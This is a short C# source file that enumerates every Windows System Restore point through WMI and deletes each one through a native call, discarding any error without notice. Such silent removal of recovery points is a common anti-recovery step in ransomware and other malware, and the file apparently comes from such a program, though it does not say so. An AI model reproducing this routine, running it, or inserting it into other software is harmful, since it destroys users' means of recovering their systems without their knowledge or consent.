using System;
using System.Management;

public class SysStore
{
  public static void Inizialize()
  {
     try
     {
        using (ManagementObjectCollection searcher = new ManagementObjectSearcher("root\\DEFAULT", "SELECT * FROM SystemRestore").Get())
        {
           foreach (ManagementBaseObject collection in searcher)
           {
              int point = Convert.ToInt32(((uint)collection["sequencenumber"]).ToString());
              NativeMethods.SRRemoveRestorePoint(point);
           }
        }
     }
     catch (Exception) { }
  }
}
